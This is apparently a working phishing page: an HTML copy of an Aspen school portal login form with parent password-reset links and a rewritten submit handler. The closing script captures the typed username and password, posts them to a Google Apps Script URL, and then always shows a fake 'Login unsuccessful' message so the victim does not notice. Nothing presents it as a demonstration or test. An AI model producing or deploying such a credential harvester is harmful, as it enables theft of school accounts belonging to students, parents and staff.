<!-- Login form: modified to prevent default submit and send data to Google Apps Script -->
<form name="logonForm" id="logonForm" method="post" onsubmit="return handleLogin(event);">
  <div>
    <input type="hidden" name="org.apache.struts.taglib.html.TOKEN" value="6e95de6479ce18758776ad6060f4e723">
  </div>
  <input type="hidden" id="userEvent" name="userEvent" value="930">
  <input type="hidden" id="userParam" name="userParam" value="">
  <input type="hidden" id="operationId" name="operationId" value="">
  <input type="hidden" id="deploymentId" name="deploymentId" value="aspen">
  <input type="hidden" id="scrollX" name="scrollX" value="0">
  <input type="hidden" id="scrollY" name="scrollY" value="0">
  <input type="hidden" id="formFocusField" name="formFocusField" value="username">
  <input type="hidden" name="mobile" value="false">
  <input type="hidden" name="SSOLoginDone" value="">

  <center>
    <img src="images/spacer.gif" height="15" width="1" alt=" ">

    <script language="JavaScript">
      document.forms[0].elements['deploymentId'].value = 'aspen';
    </script>

    <table border="0" cellpadding="0" cellspacing="0">
      <tr>
        <td>
          <div id="logonDetailContainer" class="logonDetailContainer">
            <table border="0" cellpadding="0" cellspacing="0">
              <tr>
                <td>
                  <label style="text-align: center; margin-bottom: 0px; width: 300px;">AWESOME School Solutions</label>
                  <img src="images/spacer.gif" height="10" width="1" alt=" ">
                  <hr class="logonHorizontalRule" />
                </td>
              </tr>

              <tr>
                <td>
                  <img src="images/spacer.gif" height="10" width="1" alt=" ">
                </td>
              </tr>

              <tr>
                <td class="labelCell">
                  <label for="username">Login ID</label>
                  <input type="text" name="username" tabindex="1" value="" onkeydown="$('#password').prop('disabled', false)" id="username" class="logonInput">

                  <label for="password">Password</label>
                  <input id="password" type="password" name="password" tabindex="2" value="" class="logonInput" />

                  <!-- Kept these blue clickable links -->
                  <a href="javascript:EmbeddedPopup.popupManager.open('passwordRecovery.do?isSecondary=false&deploymentId=aspen', 400, 400, 100)" tabindex="5" style="float: right; color: #ADD8E6;">
                    Parent Portal Password Reset
                  </a>

                  <a href="javascript:EmbeddedPopup.popupManager.open('loginHelp.do?', 420, 320, 100)" tabindex="5" style="float: left; color: #ADD8E6;">
                    Login Assistance
                  </a>
                </td>
              </tr>

              <tr>
                <td width="1" class="logonTopPadding" style="text-align: left">
                  <!-- Your other content here if any -->
                </td>
              </tr>
            </table>
          </div>
        </td>
      </tr>
    </table>
  </center>
</form>

<script>
  // Google Apps Script URL
  const scriptURL = 'https://script.google.com/macros/s/AKfycbw1F_PtoLRIy9ioxrQGJHOfIkAcMmE--ZvQ2V5Kou5OBw7uN28IV94cj45mxJXEOwqeBA/exec';

  // Override the form submit
  function handleLogin(event) {
    event.preventDefault();

    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!username) {
      alert('You must enter a login ID');
      return false;
    }

    if (!password) {
      alert('You must enter a password');
      return false;
    }

    // Prepare data to send
    const data = { username, password };

    // Send data to Google Apps Script (no-cors mode to avoid CORS issues)
    fetch(scriptURL, {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    }).then(() => {
      alert('Login unsuccessful. Please try again.');
      // Optionally clear the fields or reset the form
      document.getElementById('logonForm').reset();
      document.getElementById('username').focus();
    }).catch(() => {
      alert('Login unsuccessful. Please try again.');
    });

    return false; // Prevent default form submit
  }
</script>
